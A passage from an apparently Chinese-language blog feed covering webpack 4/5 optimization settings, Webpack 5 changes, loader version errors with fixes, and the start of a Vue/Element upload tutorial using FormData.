&#123;</span><br><span class="line">        <span class="string">&#x27;^/api&#x27;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">      &#125;,</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><h3 id="optimization"><a href="#optimization" class="headerlink" title="optimization"></a>optimization</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm i terser-webpack-plugin -D</span><br></pre></td></tr></table></figure><p>contenthash 缓存会导致一个问题：修改 a 文件导致 b 文件 contenthash 变化</p><p>因为在 index.js，打包后 index.js 记录了 a.js 的 hash 值，而 a.js 改变，其重新打包后的 hash 改变，导致 index.js 文件内容中记录的 a.js 的 hash 也变化，从而重新打包后 index.js 的 hash 值也会变，这样就会缓存失效</p><ul><li>splitChunks：能帮我们提取一些公共代码，呈单独 chunk 打包</li><li>runtimeChunk：解决 splitChunks 出现的一些问题（某个文件 js 修改，会导致其他 js 文件失效）</li><li>minimizer：生产环境压缩 js 可以做的更好</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; resolve &#125; = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> TerserWebpackPlugin = <span class="built_in">require</span>(<span class="string">&#x27;terser-webpack-plugin&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">  output: &#123;</span><br><span class="line">    filename: <span class="string">&#x27;js/[name].[contenthash:10].js&#x27;</span>,</span><br><span class="line">    path: resolve(__dirname, <span class="string">&#x27;build&#x27;</span>),</span><br><span class="line">    chunkFilename: <span class="string">&#x27;js/[name].[contenthash:10]_chunk.js&#x27;</span>,</span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  optimization: &#123;</span><br><span class="line">    splitChunks: &#123;</span><br><span class="line">      chunks: <span class="string">&#x27;all&#x27;</span>,</span><br><span class="line"></span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">    默认值：可以不写</span></span><br><span class="line"><span class="comment">    // 分割的chunks最小为30kb</span></span><br><span class="line"><span class="comment">    minSize: 30 * 1024,</span></span><br><span class="line"><span class="comment">    // 最大没有限制</span></span><br><span class="line"><span class="comment">    maxSize: 0,</span></span><br><span class="line"><span class="comment">    // 要提取的chunks最少被引用1次</span></span><br><span class="line"><span class="comment">    minChunks: 1,</span></span><br><span class="line"><span class="comment">    // 按需加载时并行加载的文件的最大数量</span></span><br><span class="line"><span class="comment">    maxAsyncRequests: 5,</span></span><br><span class="line"><span class="comment">    // 入口js文件最大并行数量</span></span><br><span class="line"><span class="comment">    maxInitialRequest: 3,</span></span><br><span class="line"><span class="comment">    // 名称连接符</span></span><br><span class="line"><span class="comment">    automaticNameDelimiter: &#x27;~&#x27;,</span></span><br><span class="line"><span class="comment">    // 可以使用命名规则</span></span><br><span class="line"><span class="comment">    name: true,</span></span><br><span class="line"><span class="comment">    // 分割chunk的组</span></span><br><span class="line"><span class="comment">    cacheGroup: &#123;</span></span><br><span class="line"><span class="comment">      // node_modules文件会被打包到vendors组的chunk中</span></span><br><span class="line"><span class="comment">      // 满足上面的公共规则。如：大小超过30kb，至少被引用一次</span></span><br><span class="line"><span class="comment">      vendors: &#123;</span></span><br><span class="line"><span class="comment">        test: /[\\/]node_modules[\\/]/,</span></span><br><span class="line"><span class="comment">        // 优先级</span></span><br><span class="line"><span class="comment">        priority: -10,</span></span><br><span class="line"><span class="comment">      &#125;,</span></span><br><span class="line"><span class="comment">      default: &#123;</span></span><br><span class="line"><span class="comment">        // 要提取的chunk最少被引用2次</span></span><br><span class="line"><span class="comment">        minChunks: 2,</span></span><br><span class="line"><span class="comment">        // 优先级</span></span><br><span class="line"><span class="comment">        priority: -20,</span></span><br><span class="line"><span class="comment">        // 如果当前要打包的模块和之前已经被提取的模块是同一个，就会复用，而不是重新打包模块</span></span><br><span class="line"><span class="comment">        reuseExistingChunk: true,</span></span><br><span class="line"><span class="comment">      &#125;,</span></span><br><span class="line"><span class="comment">    &#125;,</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="comment">// 当前模块记录其他模块的hash，单独打包为一个文件runtime</span></span><br><span class="line">    <span class="comment">// 解决：修改a文件导致b文件的contenthash变化</span></span><br><span class="line">    runtimeChunk: &#123;</span><br><span class="line">      name: <span class="function"><span class="params">entryPoint</span> =&gt;</span> <span class="string">`runtime-<span class="subst">$&#123;entryPoint.name&#125;</span>`</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">    minimizer: [</span><br><span class="line">      <span class="comment">// 配置生产环境的压缩方案：js和css</span></span><br><span class="line">      <span class="keyword">new</span> TerserWebpackPlugin(&#123;</span><br><span class="line">        <span class="comment">// 开启缓存</span></span><br><span class="line">        cache: <span class="literal">true</span>,</span><br><span class="line">        <span class="comment">// 开启多进程打包</span></span><br><span class="line">        parallel: <span class="literal">true</span>,</span><br><span class="line">        <span class="comment">// 启动source-map</span></span><br><span class="line">        sourceMap: <span class="literal">true</span>,</span><br><span class="line">      &#125;),</span><br><span class="line">    ],</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Webpack-5"><a href="#Webpack-5" class="headerlink" title="Webpack 5"></a>Webpack 5</h2><p>此版本重点关注以下内容：</p><ul><li>通过持久缓存提高构建性能</li><li>使用更好的算法和默认值来改善长期缓存</li><li>通过更好的树摇和代码生成来改善捆绑包大小</li><li>清除处于怪异状态的内部结构，同时在 v4 中实现功能而不引入任何重大更改</li><li>通过引入重大更改来为将来的功能做准备，以使我们能够尽可能长时间地使用 v5</li></ul><p>下载：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm i webpack@next webpack-cli -D</span><br></pre></td></tr></table></figure><h3 id="自动删除-Node-js-Polyfills"><a href="#自动删除-Node-js-Polyfills" class="headerlink" title="自动删除 Node.js Polyfills"></a>自动删除 Node.js Polyfills</h3><p>早期，webpack 的目标是允许在浏览器中运行大多数 node.js 模块，但是模块格局发生了变化，许多模块用途主要是为前端目的而编写的。webpack &lt;= 4 附带了许多 node.js 核心模块 polyfill，一旦模块使用任何核心模块（即 crypto 模块），这些模块就会自动应用</p><p>尽管这使使用为 node.js 编写的模块变得容易，但它会将这些巨大的 polyfill 添加到包中。在许多情况下，这些 polyfill 是不必要的</p><p>webpack 5 会自动停止填充这些核心模块，并专注于与前端兼容的模块</p><ul><li>尽可能尝试使用与前端兼容的模块</li><li>可以为 node.js 核心模块手动添加一个 polyfill。错误消息将提示如何实现该目标</li></ul><p>Chunk 和模块 ID，添加了用于长期缓存的新算法。在生产模式下默认情况下启用这些功能</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chunkIds: <span class="string">&quot;deterministic&quot;</span>, <span class="attr">moduleIds</span>: <span class="string">&quot;deterministic&quot;</span></span><br></pre></td></tr></table></figure><h3 id="Chunk-ID"><a href="#Chunk-ID" class="headerlink" title="Chunk ID"></a>Chunk ID</h3><p>你可以不用使用 <code>import(/* webpackChunkName: &quot;name&quot; */ &quot;module&quot;)</code> 在开发环境来为 chunk 命名，生产环境还是有必要的</p><p>webpack 内部有 chunk 命名规则，不再是以 id(0, 1, 2) 命名了</p><h3 id="Tree-Shaking"><a href="#Tree-Shaking" class="headerlink" title="Tree Shaking"></a>Tree Shaking</h3><ol><li><p>webpack 现在能够处理对嵌套模块的 tree shaking</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 在生产环境中，inner 模块暴露的 b 会被删除 */</span></span><br><span class="line"><span class="comment">// inner.js</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> a = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> b = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// module.js</span></span><br><span class="line"><span class="keyword">import</span> * <span class="keyword">as</span> inner <span class="keyword">from</span> <span class="string">&#x27;./inner&#x27;</span>;</span><br><span class="line"><span class="keyword">export</span> &#123; inner &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// user.js</span></span><br><span class="line"><span class="keyword">import</span> * <span class="keyword">as</span> <span class="built_in">module</span> <span class="keyword">from</span> <span class="string">&#x27;./module&#x27;</span>;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">module</span>.inner.a);</span><br></pre></td></tr></table></figure></li><li><p>webpack 现在能够处理多个模块之间的关系</p><p>当设置了 <code>&quot;sideEffects: false&quot;</code> 时，一旦发现 <code>test</code> 方法没有使用，不但删除 test，还会删除 <code>&quot;./someting&quot;</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; something &#125; <span class="keyword">from</span> <span class="string">&#x27;./something&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">usingSomething</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> something;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> usingSomething();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>webpack 现在能处理 Commonjs 的 tree shaking</p></li></ol><h3 id="Output"><a href="#Output" class="headerlink" title="Output"></a>Output</h3><p>webpack 4 默认只能输出 ES5 代码</p><p>webpack 5 开始新增一个属性 output.ecmaVersion，可以生成 ES5 和 ES6 代码，如：<code>output.ecmaVersion: 2015</code></p><h3 id="SplitChunk"><a href="#SplitChunk" class="headerlink" title="SplitChunk"></a>SplitChunk</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// webpack4</span></span><br><span class="line">minSize: <span class="number">30000</span>;</span><br><span class="line"><span class="comment">// webpack5，可以针对js和css明确划分</span></span><br><span class="line">minSize: &#123;</span><br><span class="line">  javascript: <span class="number">30000</span>,</span><br><span class="line">  style: <span class="number">50000</span>,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Caching"><a href="#Caching" class="headerlink" title="Caching"></a>Caching</h3><p>缓存将存储到 <code>node_modules/.cache/webpack</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 配置缓存</span></span><br><span class="line">cache: &#123;</span><br><span class="line">  <span class="comment">// 磁盘存储</span></span><br><span class="line">  type: <span class="string">&quot;filesystem&quot;</span>,</span><br><span class="line">  buildDependencies: &#123;</span><br><span class="line">    <span class="comment">// 当配置修改时，缓存失效</span></span><br><span class="line">    config: [__filename]</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="监视输出文件"><a href="#监视输出文件" class="headerlink" title="监视输出文件"></a>监视输出文件</h3><p>之前 webpack 总是在第一次构建时输出全部文件，但是监视重新构建时只更新修改的文件</p><p>此次更新在第一次构建时会找到输出文件看是否有变化，从而决定要不要输出全部文件</p><h3 id="默认值"><a href="#默认值" class="headerlink" title="默认值"></a>默认值</h3><ul><li><code>entry: &quot;./src/index.js&quot;</code></li><li><code>output.path: path.resolve(__dirname, &quot;dist&quot;)</code></li><li><code>output.filename: &quot;[name].js&quot;</code></li></ul><h2 id="推荐版本"><a href="#推荐版本" class="headerlink" title="推荐版本"></a>推荐版本</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&quot;devDependencies&quot;: &#123;</span><br><span class="line">  &quot;@babel/core&quot;: &quot;^7.10.4&quot;,</span><br><span class="line">  &quot;@babel/polyfill&quot;: &quot;^7.10.4&quot;,</span><br><span class="line">  &quot;@babel/preset-env&quot;: &quot;^7.10.4&quot;,</span><br><span class="line">  &quot;add-asset-html-webpack-plugin&quot;: &quot;^3.1.3&quot;,</span><br><span class="line">  &quot;babel&quot;: &quot;^6.23.0&quot;,</span><br><span class="line">  &quot;babel-loader&quot;: &quot;^8.1.0&quot;,</span><br><span class="line">  &quot;core-js&quot;: &quot;^3.6.5&quot;,</span><br><span class="line">  &quot;css-loader&quot;: &quot;^3.6.0&quot;,</span><br><span class="line">  &quot;eslint&quot;: &quot;^6.8.0&quot;,</span><br><span class="line">  &quot;eslint-config-airbnb-base&quot;: &quot;^14.2.0&quot;,</span><br><span class="line">  &quot;eslint-loader&quot;: &quot;^3.0.4&quot;,</span><br><span class="line">  &quot;eslint-plugin-import&quot;: &quot;^2.22.0&quot;,</span><br><span class="line">  &quot;file-loader&quot;: &quot;^5.1.0&quot;,</span><br><span class="line">  &quot;html-loader&quot;: &quot;^0.5.5&quot;,</span><br><span class="line">  &quot;html-webpack-plugin&quot;: &quot;^3.2.0&quot;,</span><br><span class="line">  &quot;jquery&quot;: &quot;^3.5.1&quot;,</span><br><span class="line">  &quot;less&quot;: &quot;^3.11.3&quot;,</span><br><span class="line">  &quot;less-loader&quot;: &quot;^5.0.0&quot;,</span><br><span class="line">  &quot;mini-css-extract-plugin&quot;: &quot;^0.9.0&quot;,</span><br><span class="line">  &quot;optimize-css-assets-webpack-plugin&quot;: &quot;^5.0.3&quot;,</span><br><span class="line">  &quot;postcss-loader&quot;: &quot;^3.0.0&quot;,</span><br><span class="line">  &quot;postcss-preset-env&quot;: &quot;^6.7.0&quot;,</span><br><span class="line">  &quot;style-loader&quot;: &quot;^1.2.1&quot;,</span><br><span class="line">  &quot;terser-webpack-plugin&quot;: &quot;^2.3.5&quot;,</span><br><span class="line">  &quot;thread-loader&quot;: &quot;^2.1.3&quot;,</span><br><span class="line">  &quot;url-loader&quot;: &quot;^3.0.0&quot;,</span><br><span class="line">  &quot;webpack&quot;: &quot;^4.43.0&quot;,</span><br><span class="line">  &quot;webpack-cli&quot;: &quot;^3.3.12&quot;,</span><br><span class="line">  &quot;webpack-dev-server&quot;: &quot;^3.11.0&quot;,</span><br><span class="line">  &quot;workbox-webpack-plugin&quot;: &quot;^5.1.3&quot;</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><h2 id="Webpack-问题汇总"><a href="#Webpack-问题汇总" class="headerlink" title="Webpack 问题汇总"></a>Webpack 问题汇总</h2><h3 id="TypeError-this-getOptions-is-not-a-function"><a href="#TypeError-this-getOptions-is-not-a-function" class="headerlink" title="TypeError: this.getOptions is not a function"></a>TypeError: this.getOptions is not a function</h3><ul><li>原因：less-loader 安装版本过高（我安装的是 9 版本的）</li><li>解决方案：<code>npm i less-loader@6 -D</code> 即可</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ERROR <span class="keyword">in</span> ./src/index.less (../node_modules/css-loader/dist/cjs.js!../node_modules/less-loader/dist/cjs.js!./src/index.less)</span><br><span class="line">Module build failed (from ../node_modules/less-loader/dist/cjs.js):</span><br><span class="line">TypeError: this.getOptions is not a <span class="keyword">function</span></span><br><span class="line">    at Object.lessLoader (F:\git_demo\Webpack-study\node_modules\less-loader\dist\index.js:19:24)</span><br><span class="line"> @ ./src/index.less 2:12-134 9:17-24 13:15-22</span><br><span class="line"> @ ./src/index.js</span><br></pre></td></tr></table></figure><h3 id="ERROR-in-Error-Child-compilation-failed"><a href="#ERROR-in-Error-Child-compilation-failed" class="headerlink" title="ERROR in   Error: Child compilation failed:"></a>ERROR in   Error: Child compilation failed:</h3><ul><li>原因：html-loader 安装版本过高（我安装的是 2 版本的）</li><li>解决方案：<code>npm i html-loader@0.5 -D</code> 即可</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ERROR <span class="keyword">in</span>   Error: Child compilation failed:</span><br><span class="line"> Module build failed (from ../node_modules/html-loader/dist/cjs.js):</span><br><span class="line"> TypeError: this.getOptions is not a <span class="keyword">function</span></span><br><span class="line"> - TypeError: this.getOptions is not a <span class="keyword">function</span></span><br><span class="line"> - ModuleBuildError: Module build failed (from ../node_modules/html-loader/dist/cjs.js):</span><br><span class="line"> - TypeError: this.getOptions is not a <span class="keyword">function</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure><h3 id="TypeError-Cannot-read-property-‘tap’-of-undefined"><a href="#TypeError-Cannot-read-property-‘tap’-of-undefined" class="headerlink" title="TypeError: Cannot read property ‘tap’ of undefined"></a>TypeError: Cannot read property ‘tap’ of undefined</h3><ul><li>原因：html-webpack-plugin 安装版本过高（我安装的是 5 版本的）</li><li>解决方案：<code>npm i html-loader@4 -D</code> 即可</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">TypeError: Cannot <span class="built_in">read</span> property <span class="string">&#x27;tap&#x27;</span> of undefined at HtmlWebpackPlugin.apply (F:\git_demo\Webpack-study\node_modules\html-webpack-plugin\index.js:40:31)  </span><br><span class="line">    at webpack (F:\git_demo\Webpack-study\node_modules\webpack\lib\webpack.js:51:13)</span><br><span class="line">    at processOptions (F:\git_demo\Webpack-study\node_modules\webpack-cli\bin\cli.js:272:16)</span><br><span class="line">    at F:\git_demo\Webpack-study\node_modules\webpack-cli\bin\cli.js:364:3</span><br><span class="line">    at Object.parse (F:\git_demo\Webpack-study\node_modules\yargs\yargs.js:576:18)</span><br><span class="line">    at F:\git_demo\Webpack-study\node_modules\webpack-cli\bin\cli.js:49:8</span><br><span class="line">    at Object.&lt;anonymous&gt; (F:\git_demo\Webpack-study\node_modules\webpack-cli\bin\cli.js:366:3)</span><br></pre></td></tr></table></figure><h3 id="img-src-”-object-Module-”"><a href="#img-src-”-object-Module-”" class="headerlink" title="img src=”[object Module]”"></a>img <em>src</em>=”[object Module]”</h3><p>因为 <code>url-loader</code> 默认使用 ES6 模块化解析，而 <code>html-loader</code> 引入图片是CommonJS，解析时会出问题：[object Module]</p><p>解决：关闭 <code>url-loader</code> 的 ES6 模块化，使用 CommonJS 解析 <code>esModule: false,</code></p><h3 id="Module-build-failed-from-node-modules-mini-css-extract-plugin-dist-loader-js"><a href="#Module-build-failed-from-node-modules-mini-css-extract-plugin-dist-loader-js" class="headerlink" title="Module build failed (from ../node_modules/mini-css-extract-plugin/dist/loader.js):"></a>Module build failed (from ../node_modules/mini-css-extract-plugin/dist/loader.js):</h3><ul><li>原因：postcss-loader 安装版本过高（我安装的是 6 版本的）</li><li>解决方案：<code>npm i postcss-loader@3 -D</code> 即可</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Module build failed (from ../node_modules/mini-css-extract-plugin/dist/loader.js):</span><br><span class="line">ModuleBuildError: Module build failed (from ../node_modules/postcss-loader/dist/cjs.js):</span><br><span class="line">ValidationError: Invalid options object. PostCSS Loader has been initialized using an options object that does not match the API schema.</span><br><span class="line"> - options has an unknown property <span class="string">&#x27;plugins&#x27;</span>. These properties are valid:</span><br><span class="line">   object &#123; postcssOptions?, execute?, sourceMap?, implementation? &#125;</span><br><span class="line">    at validate (F:\git_demo\Webpack-study\node_modules\postcss-loader\node_modules\schema-utils\dist\validate.js:104:11)</span><br><span class="line">    at Object.loader (F:\git_demo\Webpack-study\node_modules\postcss-loader\dist\index.js:43:29)    </span><br><span class="line">    at F:\git_demo\Webpack-study\node_modules\webpack\lib\NormalModule.js:316:20</span><br><span class="line">    at F:\git_demo\Webpack-study\node_modules\loader-runner\lib\LoaderRunner.js:367:11</span><br><span class="line">    at F:\git_demo\Webpack-study\node_modules\loader-runner\lib\LoaderRunner.js:233:18</span><br><span class="line"> @ ./src/js/index.js 1:0-2</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;观看视频：&lt;a href=&quot;https://www.bilibili.com/video/BV1e7411j7T5?p=24&amp;spm_id_from=pageDriver&quot;&gt;尚硅谷最新版Webpack5实战教程(从入门到精通)&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="工程化" scheme="http://llmysnow.top/categories/%E5%B7%A5%E7%A8%8B%E5%8C%96/"/>
    
    
    <category term="Vue" scheme="http://llmysnow.top/tags/Vue/"/>
    
    <category term="问题" scheme="http://llmysnow.top/tags/%E9%97%AE%E9%A2%98/"/>
    
    <category term="优化" scheme="http://llmysnow.top/tags/%E4%BC%98%E5%8C%96/"/>
    
    <category term="webpack" scheme="http://llmysnow.top/tags/webpack/"/>
    
  </entry>
  
  <entry>
    <title>Vue 中使用 Upload 组件上传图片</title>
    <link href="http://llmysnow.top/posts/5b8836c3/"/>
    <id>http://llmysnow.top/posts/5b8836c3/</id>
    <published>2021-08-31T02:16:08.891Z</published>
    <updated>2021-08-31T02:16:08.891Z</updated>
    
    <content type="html"><![CDATA[<p>vue 中使用 Element 的 upload 组件上传 Excel，大致可以分两种情况</p><ol><li><p>使用 <code>action</code> 上传到服务器</p><p>如下不讨论使用 action 上传服务器，如需了解可以参考：<a href="https://blog.csdn.net/qq_38689395/article/details/118419678">Vue 中使用 Upload 组件上传 Excel</a></p></li><li><p>使用 <code>axios</code> 上传到服务器</p><p>这里主要阐述如下两种情况</p><ul><li>使用 FormData 上传</li><li>使用 base64 上传</li></ul></li></ol><a id="more"></a><h2 id="基础知识（原理）"><a href="#基础知识（原理）" class="headerlink" title="基础知识（原理）"></a>基础知识（原理）</h2><p><strong>input file 属性</strong></p><ul><li>accept：可选择的文件类型，例如：<code>image/*</code></li><li>multiple：允许用户选择多个文件</li></ul><p>监听 input file 的 onchange 事件，打印 <code>this.files</code> 是 <strong>选取的文件集合</strong>，每一项就是选择的文件。每一项 files 包含如下属性：</p><ul><li>lastModified</li><li>lastModifiedDate</li><li>name</li><li>size</li><li>type</li></ul><h2 id="方案1：FormData-上传"><a href="#方案1：FormData-上传" class="headerlink" title="方案1：FormData 上传"></a>方案1：FormData 上传</h2><p>将本地数据上传或导入数据库，有时候需要使用 FormData 对象。FormData 接口提供了一种表示表单数据的键值对 <code>key/value</code> 的构造方式，组成一个 queryString 提交到后台</p><p><strong>注意：如下直接打印 formData 里面是空的，formData 需要用 get 方法获取值</strong></p><p>代码如下：（这个例子是只要导入就会立即上传）</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">  &lt;el-upload</span><br><span class="line">    ref=&quot;upload&quot;</span><br><span class="line">    multiple</span><br><span class="line">    action</span><br><span class="line">    :accept=&quot;fileType.join(&#x27;,&#x27;)&quot;</span><br><span class="line">    :http-request=&quot;submitUpload&quot;</span><br><span class="line">    :before-upload=&quot;beforeUpload&quot;</span><br><span class="line">    drag</span><br><span class="line">  &gt;</span><br><span class="line">    <span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">&quot;el-icon-upload&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">slot</span>=<span class="string">&quot;tip&quot;</span> <span class="attr">class</span>=<span class="string">&quot;el-upload__tip&quot;</span> <span class="attr">style</span>=<span class="string">&quot;color:red&quot;</span>&gt;</span></span><br><span class="line">      提示：仅允许导入“png”、“jpg”、“jpeg”格式文件，且不超过2M！</span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">el-upload</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="keyword">import</span> &#123; uploadFile &#125; <span class="keyword">from</span> <span class="string">&#x27;../api/index&#x27;</span></span></span><br><span class="line"><span class="javascript"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="javascript">  <span class="function"><span class="title">data</span>(<span class="params"></span>)</span> &#123;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="javascript">      fileType: [<span class="string">&#x27;image/jpeg&#x27;</span>, <span class="string">&#x27;image/jpg&#x27;</span>, <span class="string">&#x27;image/png&#x27;</span>]</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  methods: &#123;</span><br><span class="line"><span class="javascript">    <span class="function"><span class="title">submitUpload</span>(<span class="params">req</span>)</span> &#123;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">const</span> formData = <span class="keyword">new</span> FormData()</span></span><br><span class="line"><span class="javascript">      <span class="keyword">const</span> config = &#123;</span></span><br><span class="line">        headers: &#123;</span><br><span class="line"><span class="javascript">          <span 